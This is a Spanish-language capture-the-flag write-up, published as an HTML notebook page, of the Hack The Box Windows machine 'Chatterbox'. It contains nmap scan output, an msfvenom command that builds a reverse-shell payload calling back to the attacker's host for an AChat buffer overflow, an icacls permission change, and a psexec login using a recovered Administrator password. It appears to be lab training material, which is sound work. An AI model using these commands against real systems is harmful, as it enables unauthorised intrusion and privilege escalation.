@@ -1,0 +1,314 @@
+<!DOCTYPE HTML>
+<html lang="es" class="sidebar-visible no-js ayu">
+    <head>
+        <!-- Book generated using mdBook -->
+        <meta charset="UTF-8">
+        <title>Chatterbox - Secronomicón</title>
+        <!-- Custom HTML head -->
+        <meta content="text/html; charset=utf-8" http-equiv="Content-Type">
+        <meta name="description" content="Libro de notas donde encontrarás cada truco/técnica/guía de hacking que he aprendido y recolectado de CTFS, aplicaciones reales, lectura de writeups y noticias.">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <meta name="theme-color" content="#ffffff" />
+
+        <link rel="icon" href="../../../../../favicon.svg">
+        <link rel="shortcut icon" href="../../../../../favicon.png">
+        <link rel="stylesheet" href="../../../../../css/variables.css">
+        <link rel="stylesheet" href="../../../../../css/general.css">
+        <link rel="stylesheet" href="../../../../../css/chrome.css">
+        <link rel="stylesheet" href="../../../../../css/print.css" media="print">
+        <!-- Fonts -->
+        <link rel="stylesheet" href="../../../../../FontAwesome/css/font-awesome.css">
+        <link rel="stylesheet" href="../../../../../fonts/fonts.css">
+        <!-- Highlight.js Stylesheets -->
+        <link rel="stylesheet" href="../../../../../highlight.css">
+        <link rel="stylesheet" href="../../../../../tomorrow-night.css">
+        <link rel="stylesheet" href="../../../../../ayu-highlight.css">
+
+        <!-- Custom theme stylesheets -->
+    </head>
+    <body>
+        <!-- Provide site root to javascript -->
+        <script type="text/javascript">
+            var path_to_root = "../../../../../";
+            var default_theme = window.matchMedia("(prefers-color-scheme: dark)").matches ? "ayu" : "ayu";
+        </script>
+
+        <!-- Work around some values being stored in localStorage wrapped in quotes -->
+        <script type="text/javascript">
+            try {
+                var theme = localStorage.getItem('mdbook-theme');
+                var sidebar = localStorage.getItem('mdbook-sidebar');
+
+                if (theme.startsWith('"') && theme.endsWith('"')) {
+                    localStorage.setItem('mdbook-theme', theme.slice(1, theme.length - 1));
+                }
+
+                if (sidebar.startsWith('"') && sidebar.endsWith('"')) {
+                    localStorage.setItem('mdbook-sidebar', sidebar.slice(1, sidebar.length - 1));
+                }
+            } catch (e) { }
+        </script>
+
+        <!-- Set the theme before any content is loaded, prevents flash -->
+        <script type="text/javascript">
+            var theme;
+            try { theme = localStorage.getItem('mdbook-theme'); } catch(e) { }
+            if (theme === null || theme === undefined) { theme = default_theme; }
+            var html = document.querySelector('html');
+            html.classList.remove('no-js')
+            html.classList.remove('ayu')
+            html.classList.add(theme);
+            html.classList.add('js');
+        </script>
+
+        <!-- Hide / unhide sidebar before it is displayed -->
+        <script type="text/javascript">
+            var html = document.querySelector('html');
+            var sidebar = 'hidden';
+            if (document.body.clientWidth >= 1080) {
+                try { sidebar = localStorage.getItem('mdbook-sidebar'); } catch(e) { }
+                sidebar = sidebar || 'visible';
+            }
+            html.classList.remove('sidebar-visible');
+            html.classList.add("sidebar-" + sidebar);
+        </script>
+
+        <nav id="sidebar" class="sidebar" aria-label="Table of contents">
+            <div class="sidebar-scrollbox">
+                <ol class="chapter"><li class="chapter-item expanded affix "><a href="../../../../../index.html">Secronomicón</a></li><li class="chapter-item expanded affix "><li class="part-title">Guías / Cursos</li><li class="chapter-item expanded "><a href="../../../../../guides/oscp_bof/index.html"><strong aria-hidden="true">1.</strong> OSCP Buffer Overflow</a></li><li class="chapter-item expanded "><div><strong aria-hidden="true">2.</strong> Port Swigger Academy</div></li><li><ol class="section"><li class="chapter-item expanded "><a href="../../../../../guides/port_swigger_academy/sql_injection.html"><strong aria-hidden="true">2.1.</strong> SQL Injection</a></li></ol></li><li class="chapter-item expanded "><a href="../../../../../guides/pwncollege/index.html"><strong aria-hidden="true">3.</strong> PwnCollege</a></li><li><ol class="section"><li class="chapter-item expanded "><a href="../../../../../guides/pwncollege/0_module/index.html"><strong aria-hidden="true">3.1.</strong> Módulo 0</a></li></ol></li><li class="chapter-item expanded "><a href="../../../../../guides/active_directory/index.html"><strong aria-hidden="true">4.</strong> Active Directory</a></li><li><ol class="section"><li class="chapter-item expanded "><a href="../../../../../guides/active_directory/0_general.html"><strong aria-hidden="true">4.1.</strong> Teoría General</a></li><li class="chapter-item expanded "><a href="../../../../../guides/active_directory/1_attacking.html"><strong aria-hidden="true">4.2.</strong> Atacando Active Directory</a></li></ol></li><li class="chapter-item expanded "><a href="../../../../../guides/ecpptv2_lab/index.html"><strong aria-hidden="true">5.</strong> eCPPTv2 s4viLab</a></li><li><ol class="section"><li class="chapter-item expanded "><a href="../../../../../guides/ecpptv2_lab/1_aragog/index.html"><strong aria-hidden="true">5.1.</strong> Aragog</a></li><li class="chapter-item expanded "><a href="../../../../../guides/ecpptv2_lab/2_nagini/index.html"><strong aria-hidden="true">5.2.</strong> Nagini</a></li><li class="chapter-item expanded "><a href="../../../../../guides/ecpptv2_lab/3_fawkes/index.html"><strong aria-hidden="true">5.3.</strong> Fawkes</a></li><li class="chapter-item expanded "><div><strong aria-hidden="true">5.4.</strong> Matrix 1</div></li><li class="chapter-item expanded "><div><strong aria-hidden="true">5.5.</strong> Brainpan</div></li></ol></li><li class="chapter-item expanded "><a href="../../../../../guides/nightmare/index.html"><strong aria-hidden="true">6.</strong> Nightmare</a></li><li class="chapter-item expanded affix "><li class="part-title">Misc</li><li class="chapter-item expanded "><a href="../../../../../templates/index.html"><strong aria-hidden="true">7.</strong> Templates</a></li><li class="chapter-item expanded affix "><li class="part-title">Cheat Sheets</li><li class="chapter-item expanded "><a href="../../../../../cheat_sheets/general.html"><strong aria-hidden="true">8.</strong> General</a></li><li class="chapter-item expanded "><a href="../../../../../cheat_sheets/active_directory.html"><strong aria-hidden="true">9.</strong> Active Directory</a></li><li class="chapter-item expanded "><a href="../../../../../cheat_sheets/network/general.html"><strong aria-hidden="true">10.</strong> Network</a></li><li><ol class="section"><li class="chapter-item expanded "><a href="../../../../../cheat_sheets/network/pivoting.html"><strong aria-hidden="true">10.1.</strong> Pivoting</a></li></ol></li><li class="chapter-item expanded "><div><strong aria-hidden="true">11.</strong> Pwning</div></li><li><ol class="section"><li class="chapter-item expanded "><a href="../../../../../cheat_sheets/pwning/linux.html"><strong aria-hidden="true">11.1.</strong> Linux pwning</a></li><li class="chapter-item expanded "><a href="../../../../../cheat_sheets/pwning/bof-oscp.html"><strong aria-hidden="true">11.2.</strong> OSCP Buffer Overflow</a></li></ol></li><li class="chapter-item expanded "><a href="../../../../../cheat_sheets/fuzzing.html"><strong aria-hidden="true">12.</strong> Fuzzing</a></li><li class="chapter-item expanded "><a href="../../../../../cheat_sheets/inyecciones.html"><strong aria-hidden="true">13.</strong> Inyecciones</a></li><li class="chapter-item expanded "><a href="../../../../../cheat_sheets/transfer.html"><strong aria-hidden="true">14.</strong> Transferencia de archivos</a></li><li class="chapter-item expanded affix "><li class="part-title">CTFs</li><li class="chapter-item expanded "><a href="../../../../../ctfs/20220922_ctf-core2022/index.html"><strong aria-hidden="true">15.</strong> 22/09/2022 - IPN Core 2022 CTF</a></li><li class="chapter-item expanded affix "><li class="part-title">Hack The Box</li><li class="chapter-item expanded "><div><strong aria-hidden="true">16.</strong> Battlegrounds</div></li><li><ol class="section"><li class="chapter-item expanded "><a href="../../../../../htb/battlegrounds/mayhem/index.html"><strong aria-hidden="true">16.1.</strong> Cyber Mayhem</a></li></ol></li><li class="chapter-item expanded "><div><strong aria-hidden="true">17.</strong> Challenges</div></li><li class="chapter-item expanded "><div><strong aria-hidden="true">18.</strong> Boxes</div></li><li><ol class="section"><li class="chapter-item expanded "><div><strong aria-hidden="true">18.1.</strong> Linux</div></li><li><ol class="section"><li class="chapter-item expanded "><div><strong aria-hidden="true">18.1.1.</strong> Fácil</div></li><li class="chapter-item expanded "><div><strong aria-hidden="true">18.1.2.</strong> Medio</div></li><li class="chapter-item expanded "><div><strong aria-hidden="true">18.1.3.</strong> Difícil</div></li><li class="chapter-item expanded "><div><strong aria-hidden="true">18.1.4.</strong> Locura</div></li></ol></li><li class="chapter-item expanded "><div><strong aria-hidden="true">18.2.</strong> Windows</div></li><li><ol class="section"><li class="chapter-item expanded "><div><strong aria-hidden="true">18.2.1.</strong> Fácil</div></li><li><ol class="section"><li class="chapter-item expanded "><a href="../../../../../htb/boxes/windows/1_facil/Active/index.html"><strong aria-hidden="true">18.2.1.1.</strong> Active</a></li><li class="chapter-item expanded "><a href="../../../../../htb/boxes/windows/1_facil/Devel/index.html"><strong aria-hidden="true">18.2.1.2.</strong> Devel</a></li><li class="chapter-item expanded "><a href="../../../../../htb/boxes/windows/1_facil/Remote/index.html"><strong aria-hidden="true">18.2.1.3.</strong> Remote</a></li><li class="chapter-item expanded "><a href="../../../../../htb/boxes/windows/1_facil/Access/index.html"><strong aria-hidden="true">18.2.1.4.</strong> Access</a></li></ol></li><li class="chapter-item expanded "><div><strong aria-hidden="true">18.2.2.</strong> Medio</div></li><li><ol class="section"><li class="chapter-item expanded "><a href="../../../../../htb/boxes/windows/2_medio/Chatterbox/index.html" class="active"><strong aria-hidden="true">18.2.2.1.</strong> Chatterbox</a></li><li class="chapter-item expanded "><a href="../../../../../htb/boxes/windows/2_medio/Jeeves/index.html"><strong aria-hidden="true">18.2.2.2.</strong> Jeeves</a></li><li class="chapter-item expanded "><a href="../../../../../htb/boxes/windows/2_medio/SecNotes/index.html"><strong aria-hidden="true">18.2.2.3.</strong> SecNotes</a></li><li class="chapter-item expanded "><a href="../../../../../htb/boxes/windows/2_medio/Silo/index.html"><strong aria-hidden="true">18.2.2.4.</strong> Silo</a></li></ol></li><li class="chapter-item expanded "><div><strong aria-hidden="true">18.2.3.</strong> Difícil</div></li><li><ol class="section"><li class="chapter-item expanded "><a href="../../../../../htb/boxes/windows/3_dificil/Control/index.html"><strong aria-hidden="true">18.2.3.1.</strong> Control</a></li><li class="chapter-item expanded "><a href="../../../../../htb/boxes/windows/3_dificil/Search/index.html"><strong aria-hidden="true">18.2.3.2.</strong> Search</a></li></ol></li><li class="chapter-item expanded "><div><strong aria-hidden="true">18.2.4.</strong> Locura</div></li></ol></li></ol></li><li class="chapter-item expanded "><li class="part-title">echoCTF</li><li class="chapter-item expanded "><div><strong aria-hidden="true">19.</strong> Challenges</div></li><li class="chapter-item expanded "><div><strong aria-hidden="true">20.</strong> Networks</div></li><li class="chapter-item expanded "><div><strong aria-hidden="true">21.</strong> Targets</div></li><li><ol class="section"><li class="chapter-item expanded "><div><strong aria-hidden="true">21.1.</strong> Principiante</div></li><li class="chapter-item expanded "><div><strong aria-hidden="true">21.2.</strong> Básico</div></li><li><ol class="section"><li class="chapter-item expanded "><a href="../../../../../echoCTF/targets/2_basic/Flanders/index.html"><strong aria-hidden="true">21.2.1.</strong> Flanders</a></li><li class="chapter-item expanded "><a href="../../../../../echoCTF/targets/2_basic/Smithers/index.html"><strong aria-hidden="true">21.2.2.</strong> Smithers</a></li></ol></li><li class="chapter-item expanded "><div><strong aria-hidden="true">21.3.</strong> Intermedio</div></li><li class="chapter-item expanded "><div><strong aria-hidden="true">21.4.</strong> Avanzado</div></li><li class="chapter-item expanded "><div><strong aria-hidden="true">21.5.</strong> Experto</div></li><li><ol class="section"><li class="chapter-item expanded "><a href="../../../../../echoCTF/targets/5_expert/gogo-yubari/index.html"><strong aria-hidden="true">21.5.1.</strong> Gogo Yubari</a></li><li class="chapter-item expanded "><a href="../../../../../echoCTF/targets/5_expert/hajmetr/index.html"><strong aria-hidden="true">21.5.2.</strong> Hajmetr</a></li></ol></li><li class="chapter-item expanded "><div><strong aria-hidden="true">21.6.</strong> Guru</div></li></ol></li></ol>
+            </div>
+            <div id="sidebar-resize-handle" class="sidebar-resize-handle"></div>
+        </nav>
+
+        <div id="page-wrapper" class="page-wrapper">
+
+            <div class="page">
+                <div id="menu-bar-hover-placeholder"></div>
+                <div id="menu-bar" class="menu-bar sticky bordered">
+                    <div class="left-buttons">
+                        <button id="sidebar-toggle" class="icon-button" type="button" title="Toggle Table of Contents" aria-label="Toggle Table of Contents" aria-controls="sidebar">
+                            <i class="fa fa-bars"></i>
+                        </button>
+                        <button id="theme-toggle" class="icon-button" type="button" title="Change theme" aria-label="Change theme" aria-haspopup="true" aria-expanded="false" aria-controls="theme-list">
+                            <i class="fa fa-paint-brush"></i>
+                        </button>
+                        <ul id="theme-list" class="theme-popup" aria-label="Themes" role="menu">
+                            <li role="none"><button role="menuitem" class="theme" id="light">Light</button></li>
+                            <li role="none"><button role="menuitem" class="theme" id="rust">Rust</button></li>
+                            <li role="none"><button role="menuitem" class="theme" id="coal">Coal</button></li>
+                            <li role="none"><button role="menuitem" class="theme" id="navy">Navy</button></li>
+                            <li role="none"><button role="menuitem" class="theme" id="ayu">Ayu (default)</button></li>
+                        </ul>
+                        <button id="search-toggle" class="icon-button" type="button" title="Search. (Shortkey: s)" aria-label="Toggle Searchbar" aria-expanded="false" aria-keyshortcuts="S" aria-controls="searchbar">
+                            <i class="fa fa-search"></i>
+                        </button>
+                    </div>
+
+                    <h1 class="menu-title">Secronomicón</h1>
+
+                    <div class="right-buttons">
+                        <a href="../../../../../print.html" title="Print this book" aria-label="Print this book">
+                            <i id="print-button" class="fa fa-print"></i>
+                        </a>
+                    </div>
+                </div>
+
+                <div id="search-wrapper" class="hidden">
+                    <form id="searchbar-outer" class="searchbar-outer">
+                        <input type="search" id="searchbar" name="searchbar" placeholder="Search this book ..." aria-controls="searchresults-outer" aria-describedby="searchresults-header">
+                    </form>
+                    <div id="searchresults-outer" class="searchresults-outer hidden">
+                        <div id="searchresults-header" class="searchresults-header"></div>
+                        <ul id="searchresults">
+                        </ul>
+                    </div>
+                </div>
+                <!-- Apply ARIA attributes after the sidebar and the sidebar toggle button are added to the DOM -->
+                <script type="text/javascript">
+                    document.getElementById('sidebar-toggle').setAttribute('aria-expanded', sidebar === 'visible');
+                    document.getElementById('sidebar').setAttribute('aria-hidden', sidebar !== 'visible');
+                    Array.from(document.querySelectorAll('#sidebar a')).forEach(function(link) {
+                        link.setAttribute('tabIndex', sidebar === 'visible' ? 0 : -1);
+                    });
+                </script>
+
+                <div id="content" class="content">
+                    <main>
+                        <h1 id="estadísticas"><a class="header" href="#estadísticas">Estadísticas</a></h1>
+<div class="table-wrapper"><table><thead><tr><th>Característica</th><th>Descripción</th></tr></thead><tbody>
+<tr><td>Nombre</td><td><a href="https://www.hackthebox.com/home/machines/profile/123">Chatterbox</a></td></tr>
+<tr><td>OS</td><td>Windows</td></tr>
+<tr><td>Dificultad oficial</td><td>Medium</td></tr>
+<tr><td>Dificultad de comunidad</td><td><img src="images/difficulty.png" alt="Dificultad" /></td></tr>
+<tr><td>Puntos</td><td>30</td></tr>
+<tr><td>Creadores</td><td><a href="https://www.hackthebox.com/home/users/profile/709">lkys37en</a></td></tr>
+</tbody></table>
+</div>
+<h1 id="reconocimiento"><a class="header" href="#reconocimiento">Reconocimiento</a></h1>
+<h2 id="escaneo-de-host"><a class="header" href="#escaneo-de-host">Escaneo de host</a></h2>
+<h3 id="escaneo-completo-de-puertos"><a class="header" href="#escaneo-completo-de-puertos">Escaneo completo de puertos</a></h3>
+<pre><code class="language-bash">└─$ nmap -T5 -vvv -open -p- -n -Pn -oG nmap/all_ports $TARGET
+Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
+Starting Nmap 7.92 ( https://nmap.org ) at 2022-05-27 13:36 EDT
+Initiating Connect Scan at 13:36
+Scanning 10.10.10.74 [65535 ports]
+Discovered open port 135/tcp on 10.10.10.74
+Discovered open port 139/tcp on 10.10.10.74
+Discovered open port 445/tcp on 10.10.10.74
+Discovered open port 49152/tcp on 10.10.10.74
+Discovered open port 49154/tcp on 10.10.10.74
+Discovered open port 9256/tcp on 10.10.10.74
+Discovered open port 49153/tcp on 10.10.10.74
+Discovered open port 9255/tcp on 10.10.10.74
+Discovered open port 49155/tcp on 10.10.10.74
+Discovered open port 49157/tcp on 10.10.10.74
+Discovered open port 49156/tcp on 10.10.10.74
+Completed Connect Scan at 13:37, 29.11s elapsed (65535 total ports)
+Nmap scan report for 10.10.10.74
+Host is up, received user-set (0.073s latency).
+Scanned at 2022-05-27 13:36:42 EDT for 29s
+Not shown: 54223 closed tcp ports (conn-refused), 11301 filtered tcp ports (no-response)
+Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
+PORT      STATE SERVICE      REASON
+135/tcp   open  msrpc        syn-ack
+139/tcp   open  netbios-ssn  syn-ack
+445/tcp   open  microsoft-ds syn-ack
+9255/tcp  open  mon          syn-ack
+9256/tcp  open  unknown      syn-ack
+49152/tcp open  unknown      syn-ack
+49153/tcp open  unknown      syn-ack
+49154/tcp open  unknown      syn-ack
+49155/tcp open  unknown      syn-ack
+49156/tcp open  unknown      syn-ack
+49157/tcp open  unknown      syn-ack
+
+Read data files from: /usr/bin/../share/nmap
+Nmap done: 1 IP address (1 host up) scanned in 29.15 seconds
+</code></pre>
+<h3 id="escaneo-específico"><a class="header" href="#escaneo-específico">Escaneo específico</a></h3>
+<pre><code class="language-bash">└─$ nmap -sCV -p 135,139,445,9255,9256,49152,49153,49154,49155,49156,49157 -n -Pn -oN nmap/targeted $TARGET
+Starting Nmap 7.92 ( https://nmap.org ) at 2022-05-27 13:39 EDT
+Nmap scan report for 10.10.10.74
+Host is up (0.074s latency).
+
+PORT      STATE SERVICE      VERSION
+135/tcp   open  msrpc        Microsoft Windows RPC
+139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
+445/tcp   open  microsoft-ds Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)
+9255/tcp  open  http         AChat chat system httpd
+|_http-server-header: AChat
+|_http-title: Site doesn't have a title.
+9256/tcp  open  achat        AChat chat system
+49152/tcp open  msrpc        Microsoft Windows RPC
+49153/tcp open  msrpc        Microsoft Windows RPC
+49154/tcp open  msrpc        Microsoft Windows RPC
+49155/tcp open  msrpc        Microsoft Windows RPC
+49156/tcp open  msrpc        Microsoft Windows RPC
+49157/tcp open  msrpc        Microsoft Windows RPC
+Service Info: Host: CHATTERBOX; OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+|_clock-skew: mean: 6h20m01s, deviation: 2h18m36s, median: 4h59m59s
+| smb2-time:
+|   date: 2022-05-27T22:40:43
+|_  start_date: 2022-05-27T22:34:47
+| smb-security-mode:
+|   account_used: guest
+|   authentication_level: user
+|   challenge_response: supported
+|_  message_signing: disabled (dangerous, but default)
+| smb2-security-mode:
+|   2.1:
+|_    Message signing enabled but not required
+| smb-os-discovery:
+|   OS: Windows 7 Professional 7601 Service Pack 1 (Windows 7 Professional 6.1)
+|   OS CPE: cpe:/o:microsoft:windows_7::sp1:professional
+|   Computer name: Chatterbox
+|   NetBIOS computer name: CHATTERBOX\x00
+|   Workgroup: WORKGROUP\x00
+|_  System time: 2022-05-27T18:40:47-04:00
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 70.63 seconds
+</code></pre>
+<h1 id="enumeración"><a class="header" href="#enumeración">Enumeración</a></h1>
+<h2 id="servicios"><a class="header" href="#servicios">Servicios</a></h2>
+<h3 id="achat---9255-9256"><a class="header" href="#achat---9255-9256">achat - 9255, 9256</a></h3>
+<h4 id="manual"><a class="header" href="#manual">Manual</a></h4>
+<p>Al buscar hacer un reconocimiento directamente por alguna versión vulnerable se encontró <a href="https://github.com/mpgn/AChat-Reverse-TCP-Exploit">este repositorio en github</a> de una prueba de concepto sobre la explotación del programa, probado en su versión y arquitectura <code>AChat 0.150 Beta 7 Windows 7/8/10 x86/x64</code>. Por lo que directamente se probó el exploit.</p>
+<h1 id="explotación"><a class="header" href="#explotación">Explotación</a></h1>
+<h2 id="buffer-overflow---rce"><a class="header" href="#buffer-overflow---rce">Buffer Overflow - RCE</a></h2>
+<h3 id="pasos-previos--preparación"><a class="header" href="#pasos-previos--preparación">Pasos previos | Preparación</a></h3>
+<p>Dadas las indicaciones en la PoC se generó el shellcode correspondiente usando:</p>
+<pre><code class="language-bash">msfvenom -a x86 --platform Windows -p windows/shell_reverse_tcp RHOST=$RHOST LHOST=10.10.14.16 LPORT=4321 exitfunc=thread -e x86/unicode_mixed -b '\x00\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff' BufferRegister=EAX -f python &gt; scode.txt
+</code></pre>
+<p>Sustituyendo los valores correspondientes en el script del shellcode y host.</p>
+<h3 id="ejecución"><a class="header" href="#ejecución">Ejecución</a></h3>
+<p>Obteniendo acceso como el usuario <code>alfred</code>.</p>
+<p><img src="images/exploit_1.png" alt="Acceso como usuario alfred" /></p>
+<h1 id="post-explotación"><a class="header" href="#post-explotación">Post Explotación</a></h1>
+<h2 id="enumeración-1"><a class="header" href="#enumeración-1">Enumeración</a></h2>
+<p>Posteriormente al ejecutar <a href="https://github.com/carlospolop/PEASS-ng">winPEAS</a>, se identificaron dos rutas potenciales a probar:</p>
+<ol>
+<li>El usuario con el que se cuenta (alfred) tiene acceso completo al directorio del usuario Administrator.</li>
+<li>Existen credenciales AutoLogon visibles.</li>
+</ol>
+<p><img src="images/post_1.png" alt="Rutas potenciales" /></p>
+<h2 id="escalación-de-privilegios"><a class="header" href="#escalación-de-privilegios">Escalación de privilegios</a></h2>
+<h3 id="alfred--nt-authority-system"><a class="header" href="#alfred--nt-authority-system">alfred → nt authority system</a></h3>
+<p>En el primer caso, bastaría con leer, escribir o ejecutar cualquier archivo dentro del directorio, si llegara a suceder que no se permite el acceso a un archivo bastaría con hacer uso de <code>icacls</code> para efectuar el cambio de permisos lo cual por herencia o jerarquía del directorio, se permitiría este cambio pudiendo así leer la bandera de <code>root.txt</code>.</p>
+<p>Por medio de:</p>
+<pre><code class="language-powershell">icacls .\root.txt /e /p alfred:f
+</code></pre>
+<p>Tomando como referencia <a href="https://www.cyberciti.biz/tips/windows-change-access-permissions-from-the-command-line.html">este post</a> para verificar el uso del binario.</p>
+<p><img src="images/post_2.png" alt="Cambio de permisos" /></p>
+<p>En el segundo caso, al probar alguna herramienta que permita acceso al sistema con credenciales como <code>psexec</code> se puede obtener una shell como <code>NT AUTHORITY SYSTEM</code>, probando las credenciales obtenidas anteriormente bajo la suposición de reutilización de contraseña.</p>
+<p>Ejecutando:</p>
+<pre><code class="language-bash">impacket-psexec 'Administrator:Welcome1!@10.10.10.74'
+</code></pre>
+<p><img src="images/post_3.png" alt="Acceso como nt authority system" /></p>
+<h1 id="referencias"><a class="header" href="#referencias">Referencias</a></h1>
+<ul>
+<li><a href="https://github.com/mpgn/AChat-Reverse-TCP-Exploit">AChat expoit</a>.</li>
+<li><a href="https://www.cyberciti.biz/tips/windows-change-access-permissions-from-the-command-line.html">Windows change access permissions from the command line</a>.</li>
+</ul>
+
+                    </main>
+
+                    <nav class="nav-wrapper" aria-label="Page navigation">
+                        <!-- Mobile navigation buttons -->
+                            <a rel="prev" href="../../../../../htb/boxes/windows/1_facil/Access/index.html" class="mobile-nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts="Left">
+                                <i class="fa fa-angle-left"></i>
+                            </a>
+                            <a rel="next" href="../../../../../htb/boxes/windows/2_medio/Jeeves/index.html" class="mobile-nav-chapters next" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts="Right">
+                                <i class="fa fa-angle-right"></i>
+                            </a>
+                        <div style="clear: both"></div>
+                    </nav>
+                </div>
+            </div>
+
+            <nav class="nav-wide-wrapper" aria-label="Page navigation">
+                    <a rel="prev" href="../../../../../htb/boxes/windows/1_facil/Access/index.html" class="nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts="Left">
+                        <i class="fa fa-angle-left"></i>
+                    </a>
+                    <a rel="next" href="../../../../../htb/boxes/windows/2_medio/Jeeves/index.html" class="nav-chapters next" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts="Right">
+                        <i class="fa fa-angle-right"></i>
+                    </a>
+            </nav>
+
+        </div>
+
+        <script type="text/javascript">
+            window.playground_copyable = true;
+        </script>
+        <script src="../../../../../elasticlunr.min.js" type="text/javascript" charset="utf-8"></script>
+        <script src="../../../../../mark.min.js" type="text/javascript" charset="utf-8"></script>
+        <script src="../../../../../searcher.js" type="text/javascript" charset="utf-8"></script>
+        <script src="../../../../../clipboard.min.js" type="text/javascript" charset="utf-8"></script>
+        <script src="../../../../../highlight.js" type="text/javascript" charset="utf-8"></script>
+        <script src="../../../../../book.js" type="text/javascript" charset="utf-8"></script>
+
+        <!-- Custom JS scripts -->
+    </body>
+</html>
